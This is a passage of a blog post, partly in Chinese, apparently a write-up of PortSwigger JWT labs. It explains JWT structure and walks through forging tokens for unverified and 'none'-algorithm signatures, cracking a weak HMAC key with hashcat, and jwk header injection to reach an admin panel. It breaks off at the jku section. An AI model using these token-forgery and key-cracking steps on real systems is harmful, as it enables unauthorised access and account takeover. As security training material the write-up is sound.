<!DOCTYPE html>
<html lang="en">
    
    <style>
        body
        {
            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   LXGW WenKai   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;

        }
    </style>

    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <meta name="description" content="JWT attacks" />
    <meta name="hexo-theme-A4" content="v1.9.6" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>Jay1anğŸˆ</title>

    
        
<link rel="stylesheet" href="/css/highlight/style1.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    

    
        
<link rel="stylesheet" href="/css/returnToLastPage.css">

    
    
   
<link rel="stylesheet" href="/css/lightgallery-bundle.min.css">


<meta name="generator" content="Hexo 7.3.0"></head>
    
    

    
    



    

    
    

    
    
    
    <body>
        <script src="/js/darkmode-js.min.js"></script>
        
        <script>
            const options = {
                bottom: '40px', // default: '32px'
                right: 'unset', // default: '32px'
                left: '42px', // default: 'unset'
                time: '0.3s', // default: '0.3s'
                mixColor: '#fff', // default: '#fff'
                backgroundColor: ' #e4e4e4 ',  // default: '#fff'
                buttonColorDark: '#100f2c',  // default: '#100f2c'
                buttonColorLight: '#fff', // default: '#fff'
                saveInCookies: true, // default: true,
                label: 'ğŸŒ“', // default: ''
                autoMatchOsTheme: true // default: true
            }
            const darkmode = new Darkmode(options);
            darkmode.showWidget();
        </script>
        
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    


<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">Jay1anğŸˆ</a> 
            <span class="description">I am who I am.</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">â›©ï¸é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">ğŸ—’ï¸æ–‡ç« </a></li>
            
        
            
                <li><a href="/categories/">ğŸ·ï¸åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">ğŸ¨å…³äº</a></li>
            
        
            
                <li><a href="/now/">ğŸ¡Now</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">
    

    
        
            
                <div class="post-main-title" style="text-align: center;">
                    JWT attacks
                </div>
            
        
      
    

    

        
            <div class="post-head-meta-center">
        
                
                    <span>æœ€è¿‘æ›´æ–°ï¼š2024-07-02</span> 
                
                
                    
                        &nbsp; | &nbsp;
                    
                     <span>å­—æ•°æ€»è®¡ï¼š5.8k</span>
                
                
                    
                        &nbsp; | &nbsp;
                    
                    <span>é˜…è¯»ä¼°æ—¶ï¼š27åˆ†é’Ÿ</span>
                
                
                    
                        &nbsp; | &nbsp;
                    
                    <span id="busuanzi_container_page_pv">
                        é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
                    </span>
                
            </div>
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%89%8D%E8%A8%80"><span class="post-toc-text">å‰è¨€</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#What-are-JWTs"><span class="post-toc-text">What are JWTs</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-format"><span class="post-toc-text">JWT format</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-signature"><span class="post-toc-text">JWT signature</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#JWT-labs"><span class="post-toc-text">JWT-labs</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Accepting-arbitrary-signatures"><span class="post-toc-text">Accepting arbitrary signatures</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Accepting-tokens-with-no-signature"><span class="post-toc-text">Accepting tokens with no signature</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Brute-forcing-secret-keys"><span class="post-toc-text">Brute-forcing secret keys</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-header-parameter-injections"><span class="post-toc-text">JWT header parameter injections</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-jwk-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the jwk parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-jku-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the jku parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Injecting-self-signed-JWTs-via-the-kid-parameter"><span class="post-toc-text">Injecting self-signed JWTs via the kid parameter</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Other-interesting-JWT-header-parameters"><span class="post-toc-text">Other interesting JWT header parameters</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-algorithm-confusion"><span class="post-toc-text">JWT algorithm confusion</span></a></li></ol></li></ol>
            
        
        <div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› 23æš‘æœŸå®è®­é’ˆå¯¹crAPIé¶åœºå®éªŒä¸­JWTéƒ¨åˆ†æœªæˆåŠŸï¼Œæ‰€ä»¥åˆé‡æ–°ä½¿ç”¨PortSwiggerä¸Šçš„Labsé‡æ–°ç»ƒä¹ ã€‚</p>
<p>è‹±æ–‡éƒ¨åˆ†ä»PortSwiggerä¸Šå¤åˆ¶ã€‚</p>
<p>è¯¦ç»†å†…å®¹è¯·è®¿é—®ï¼š<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt">https://portswigger.net/web-security/jwt</a></p>
<h2 id="What-are-JWTs"><a href="#What-are-JWTs" class="headerlink" title="What are JWTs"></a>What are JWTs</h2><p>JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information (â€œclaimsâ€) about users as part of authentication, session handling, and access control mechanisms.</p>
<p>Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.</p>
<h3 id="JWT-format"><a href="#JWT-format" class="headerlink" title="JWT format"></a>JWT format</h3><p>A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA</span><br></pre></td></tr></table></figure>

<p>The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual â€œclaimsâ€ about the user. For example, you can decode the payload from the token above to reveal the following claims:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">	&quot;iss&quot;: &quot;portswigger&quot;,   </span><br><span class="line">	&quot;exp&quot;: 1648037164,    </span><br><span class="line">	&quot;name&quot;: &quot;Carlos Montoya&quot;,    </span><br><span class="line">	&quot;sub&quot;: &quot;carlos&quot;,    </span><br><span class="line">	&quot;role&quot;: &quot;blog_author&quot;,    </span><br><span class="line">	&quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;,    </span><br><span class="line">	&quot;iat&quot;: 1516239022 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the security of any JWT-based mechanism is heavily reliant on the cryptographic signature.</p>
<h3 id="JWT-signature"><a href="#JWT-signature" class="headerlink" title="JWT signature"></a>JWT signature</h3><p>The server that issues the token typically generates the signature by hashing the header and payload. In some cases, they also encrypt the resulting hash. Either way, this process involves a secret signing key. This mechanism provides a way for servers to verify that none of the data within the token has been tampered with since it was issued:</p>
<ul>
<li>As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.</li>
<li>Without knowing the serverâ€™s secret signing key, it shouldnâ€™t be possible to generate the correct signature for a given header or payload.</li>
</ul>
<h2 id="JWT-labs"><a href="#JWT-labs" class="headerlink" title="JWT-labs"></a>JWT-labs</h2><h3 id="Accepting-arbitrary-signatures"><a href="#Accepting-arbitrary-signatures" class="headerlink" title="Accepting arbitrary signatures"></a>Accepting arbitrary signatures</h3><p>JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library <code>jsonwebtoken</code> has <code>verify()</code> and <code>decode()</code>.</p>
<p>Occasionally, developers confuse these two methods and only pass incoming tokens to the <code>decode()</code> method. This effectively means that the application doesnâ€™t verify the signature at all.</p>
<p>å³ç¨‹åºå‘˜å°†<code>verify()</code>å’Œ<code>decode()</code>å¼„æ··äº†ï¼Œå¯¼è‡´ç½‘ç«™åå°å¹¶æ²¡æœ‰æ£€éªŒç­¾åæœ‰æ•ˆæ€§ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature"><strong>Lab1: JWT authentication bypass via unverified signature</strong></a></p>
<p>é¦–å…ˆï¼Œç”¨å·²æœ‰çš„æ™®é€šç”¨æˆ·çš„è´¦å·å¯†ç ç™»å½•ï¼Œç„¶åä½¿ç”¨Burp SuiteæŠ“åŒ…å¯ä»¥çŸ¥é“Cookieä¸­çš„Sessionå­˜æ”¾ç€JWTã€‚</p>
<p><a href="/../img/JWT-attacks/1-1.png" title="1-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-1.png" alt="1-1"></a></p>
<p>æ¥ç€ä½¿ç”¨base64è§£ç ä¹‹åå¯ä»¥å¾—åˆ°headerå’Œpayloadéƒ¨åˆ†çš„å†…å®¹ï¼š</p>
<p><a href="/../img/JWT-attacks/1-2.png" title="1-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-2.png" alt="1-2"></a></p>
<p>ç”±äºLab 1å¹¶æ²¡æœ‰éªŒè¯signatureéƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†<code>sub</code>çš„å€¼æ”¹ä¸ºadminï¼Œå¾—åˆ°æ–°çš„JWTï¼š</p>
<p><a href="/../img/JWT-attacks/1-3.png" title="1-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-3.png" alt="1-3"></a></p>
<p>é€šè¿‡Burp Suiteå°†Sessionçš„å€¼æ›¿æ¢ï¼Œå³å¯ä»¥è¾¾åˆ°ä»¥adminèº«ä»½ç™»å½•çš„æ•ˆæœã€‚ä½†æ˜¯æ— æ³•è®¿é—®&#x2F;adminç›®å½•ï¼Œå†å°†subæ”¹ä¸ºadministratorå³å¯ï¼Œç„¶åæ‰§è¡Œåˆ é™¤carlosçš„æ“ä½œå³å¯å®Œæˆå®éªŒã€‚</p>
<p><a href="/../img/JWT-attacks/1-4.png" title="1-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/1-4.png" alt="1-4"></a></p>
<p>å¯ä»¥ç›´æ¥ç™»å½•æ“ä½œï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¿é—®æ¥å£åˆ é™¤:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>



<h3 id="Accepting-tokens-with-no-signature"><a href="#Accepting-tokens-with-no-signature" class="headerlink" title="Accepting tokens with no signature"></a>Accepting tokens with no signature</h3><p>Among other things, the JWT header contains an <code>alg</code> parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>    </span><br><span class="line">	<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasnâ€™t been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.</p>
<p>JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the <code>alg</code> parameter is set to <code>none</code>, which indicates a so-called â€œunsecured JWTâ€. Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.</p>
<p>å³æœåŠ¡å™¨ä¼šæ ¹æ®<code>alg</code>çš„å€¼æ¥ç¡®å®šéªŒè¯çš„ç®—æ³•ï¼Œå¦‚æœ<code>alg</code>ä¸ºnoneï¼Œåˆ™æœåŠ¡å™¨å°±ä¸ä¼šå¯¹signatureéƒ¨åˆ†è¿›è¡Œæ£€æµ‹ï¼Œç”±äºè¿™æ ·çš„é”™è¯¯æ¯”è¾ƒæ˜æ˜¾ï¼ŒæœåŠ¡å™¨åå°ç¨‹åºå‘˜ä¸€èˆ¬ä¸ä¼šå…è®¸<code>alg</code>ä¸ºnoneï¼ˆé€šè¿‡å­—ç¬¦ä¸²è¿‡æ»¤ç­‰æŠ€æœ¯ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€‰æ‹©æ–¹æ³•ï¼ˆç±»ä¼¼æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç»•è¿‡ï¼‰è¿›è¡Œç»•è¿‡ã€‚</p>
<p>æ³¨ï¼šå³ä½¿ä¸éªŒè¯signatureï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è¦æœ‰<code>.</code>è¡¨ç¤ºåˆ†å‰²ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification"><strong>Lab2: JWT authentication bypass via flawed signature verification</strong></a></p>
<p>åŒLab 1ä¸€æ ·ï¼Œåˆ©ç”¨å·²çŸ¥çš„è´¦å·å¯†ç ç™»å½•è·å¾—Sessionä¸­å­˜çš„JWTï¼Œå†å¯¹JWTè¿›è¡Œä¿®æ”¹å³å¯ã€‚</p>
<p><a href="/../img/JWT-attacks/2-1.png" title="2-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/2-1.png" alt="2-1"></a></p>
<p>æµ‹è¯•åå‘ç°ï¼Œsignatureéƒ¨åˆ†è¦ä¸ºç©ºæ‰èƒ½æˆåŠŸç™»å½•&#x2F;adminé¡µé¢ã€‚ç™»é™†ååˆ é™¤carlosç”¨æˆ·å®Œæˆå®éªŒã€‚</p>
<p><a href="/../img/JWT-attacks/2-2.png" title="2-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/2-2.png" alt="2-2"></a></p>
<h3 id="Brute-forcing-secret-keys"><a href="#Brute-forcing-secret-keys" class="headerlink" title="Brute-forcing secret keys"></a>Brute-forcing secret keys</h3><p>Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, itâ€™s crucial that this secret canâ€™t be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.</p>
<p>When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret thatâ€™s provided as an example. In this case, it can be trivial for an attacker to brute-force a serverâ€™s secret using a <a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of well-known secrets</a>.</p>
<p><strong>Brute-forcing secret keys using hashcat</strong></p>
<p>You just need a valid, signed JWT from the target server and a <a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of well-known secrets</a>. You can then run the following command, passing in the JWT and wordlist as arguments:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;</span><br></pre></td></tr></table></figure>

<p>Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server. If any of the signatures match, hashcat outputs the identified secret in the following format, along with various other details:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jwt&gt;:&lt;identified-secret&gt;</span><br></pre></td></tr></table></figure>

<p>å³æœ‰çš„ç½‘ç«™çš„åå°çš„JWTéªŒè¯ç¨‹åºä½¿ç”¨äº†å¼±å¯†é’¥ï¼Œæˆ–è€…æœ‰äº›ç¨‹åºå‘˜ä¼šç›´æ¥ç²˜è´´ç½‘ä¸Šçš„çº¿ç¨‹çš„ç¨‹åºå¹¶ä¸”æ²¡æœ‰æ”¹å¯†ç ï¼Œè¿™æ ·å°±å¯ä»¥è¢«æš´åŠ›ç ´è§£ï¼Œç„¶åè¿™é‡Œæš´åŠ›ç ´è§£ç”¨åˆ°çš„å·¥å…·æ˜¯hashcatã€‚</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key"><strong>Lab3: JWT authentication bypass via weak signing key</strong></a></p>
<p>é¦–å…ˆå…ˆè·å¾—å·²çŸ¥ç”¨æˆ·wienerçš„JWTï¼Œåˆ©ç”¨Wordlistä¸­çš„æ‰€æœ‰å¯†é’¥éå†ï¼Œç›´åˆ°æ‰¾å‡ºç¬¦åˆçš„é‚£ä¸€ä¸ªã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†hashcatå·¥å…·ï¼Œåœ¨hashactçš„ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;</span><br></pre></td></tr></table></figure>

<p>-a æŒ‡ â€“attack-modeï¼Œ0è¡¨ç¤ºæ”»å‡»æ¨¡å¼ä¸­çš„Straightï¼›-m æŒ‡ â€“hash-typeï¼Œ16500è¡¨ç¤ºJWTã€‚</p>
<p><a href="/../img/JWT-attacks/3-1.png" title="3-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-1.png" alt="3-1"></a></p>
<p>æ‰§è¡Œç»“æŸåå¯ä»¥çœ‹åˆ°æ‰§è¡ŒåŠ å¯†çš„å¯†é’¥ä¸ºsecret1</p>
<p><a href="/../img/JWT-attacks/3-2.png" title="3-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-2.png" alt="3-2"></a></p>
<p>ç„¶åå†æ›´æ”¹JWTçš„headerå’Œpayloadï¼Œåœ¨ç”¨å¯†é’¥å¯¹å…¶ç­¾åå³å¯ã€‚</p>
<p><a href="/../img/JWT-attacks/3-3.png" title="3-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-3.png" alt="3-3"></a></p>
<p>æœ€ååœ¨Burp Suiteä¸­ä¿®æ”¹Sessionä¸­çš„JWTï¼Œä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®åˆ°&#x2F;adminç›®å½•ï¼Œå¹¶åˆ é™¤ç”¨æˆ·carlosã€‚</p>
<p><a href="/../img/JWT-attacks/3-4.png" title="3-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/3-4.png" alt="3-4"></a></p>
<h3 id="JWT-header-parameter-injections"><a href="#JWT-header-parameter-injections" class="headerlink" title="JWT header parameter injections"></a>JWT header parameter injections</h3><p>According to the JWS specification, only the <code>alg</code> header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.</p>
<ul>
<li><code>jwk</code> (JSON Web Key) - Provides an embedded JSON object representing the key.</li>
<li><code>jku</code> (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.</li>
<li><code>kid</code> (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching <code>kid</code> parameter.</li>
</ul>
<p>As you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. In this section, youâ€™ll learn how to exploit these to inject modified JWTs signed using your own arbitrary key rather than the serverâ€™s secret.</p>
<h4 id="Injecting-self-signed-JWTs-via-the-jwk-parameter"><a href="#Injecting-self-signed-JWTs-via-the-jwk-parameter" class="headerlink" title="Injecting self-signed JWTs via the jwk parameter"></a>Injecting self-signed JWTs via the jwk parameter</h4><p>The JSON Web Signature (JWS) specification describes an optional <code>jwk</code> header parameter, which servers can use to embed their public key directly within the token itself in JWK format.</p>
<blockquote>
<p> A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.</p>
</blockquote>
<p>You can see an example of this in the following JWT header:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>    </span><br><span class="line">	<span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jwk&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    	<span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot;</span>    </span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key thatâ€™s embedded in the <code>jwk</code> parameter.</p>
<p>You can exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the <code>jwk</code> header.</p>
<p>å³æˆ‘ä»¬å¯ä»¥åœ¨JWTçš„å¤´éƒ¨æ’å…¥<code>jwk</code>ï¼Œè®©æœåŠ¡å™¨åˆ©ç”¨æˆ‘ä»¬ç»™å¯†é’¥æ¥è¿›è¡ŒéªŒè¯ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºä¸€å¯¹RSAå…¬ç§é’¥ï¼Œå…ˆå°†headerçš„<code>jwk</code>éƒ¨åˆ†å¡«å……æˆ‘ä»¬è‡ªå·±çš„å…¬é’¥ï¼Œç„¶åç”¨è‡ªå·±çš„ç§é’¥å¯¹headerå’Œpayloadè¿›è¡Œç­¾åï¼Œç”Ÿæˆsignatureï¼Œè¿™æ ·å®Œæˆäº†JWTçš„åˆ›å»ºã€‚</p>
<p>æˆ‘ä»¬å°†æ­¤JWTå‘é€è‡³æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®å¤´éƒ¨çš„jwkå¯¹signatureéƒ¨åˆ†è¿›è¡ŒéªŒè¯ï¼Œç”±äºè¿™æ˜¯ä¸€å¯¹å…¬ç§é’¥ï¼Œæ‰€ä»¥å¯ä»¥è¢«éªŒè¯æˆåŠŸã€‚</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection"><strong>Lab4: JWT authentication bypass via jwk header injection</strong></a></p>
<p>é¦–å…ˆè¿˜æ˜¯ç™»å½•å·²çŸ¥çš„è´¦å·ï¼Œè·å¾—wienerï¼ˆä¸€ç›´è´¦å·çš„åç§°ï¼‰çš„JWTï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ã€‚</p>
<p>æˆ‘ä»¬åˆ©ç”¨Burp Suiteçš„JWTæ’ä»¶è‡ªåŠ¨ç”ŸæˆRSAå…¬ç§é’¥å¯¹ï¼š</p>
<p><a href="/../img/JWT-attacks/4-1.png" title="4-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-1.png" alt="4-1"></a></p>
<p>æ¥ç€å°†payloadçš„<code>sub</code>æ”¹ä¸ºadministratorï¼Œå†ç‚¹å‡»Attackï¼Œä½¿ç”¨Embedded JWTåŠŸèƒ½ï¼ŒBurp Suiteä¼šè‡ªåŠ¨å°†åˆšæ‰åˆ›å»ºçš„å…¬é’¥ä½œä¸ºjwkæ·»åŠ åˆ°headerä¸­ï¼Œå°†headerä¸­çš„kidå’Œjwkä¸­çš„kidæ”¹ä¸ºä¸€è‡´ï¼Œå¹¶ä¸”ç”¨ç§é’¥å¯¹headerå’Œpayloadè¿›è¡ŒåŠ å¯†ç”Ÿæˆsignatureã€‚</p>
<p><a href="/../img/JWT-attacks/4-2.png" title="4-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-2.png" alt="4-2"></a></p>
<p>è‡³æ­¤å°±å®Œæˆäº†å¯¹JWTçš„ä¿®æ”¹ï¼Œç„¶åç›´æ¥åˆ©ç”¨è¯¥JWTç™»å½•ç®¡ç†å‘˜ç•Œé¢ï¼Œåˆ é™¤carlosç”¨æˆ·å³å¯å®Œæˆå®éªŒã€‚</p>
<p><a href="/../img/JWT-attacks/4-3.png" title="4-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/4-3.png" alt="4-3"></a></p>
<h4 id="Injecting-self-signed-JWTs-via-the-jku-parameter"><a href="#Injecting-self-signed-JWTs-via-the-jku-parameter" class="headerlink" title="Injecting self-signed JWTs via the jku parameter"></a>Injecting self-signed JWTs via the jku parameter</h4><p>Instead of embedding public keys directly using the <code>jwk</code> header parameter, some servers let you use the <code>jku</code> (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.</p>
<blockquote>
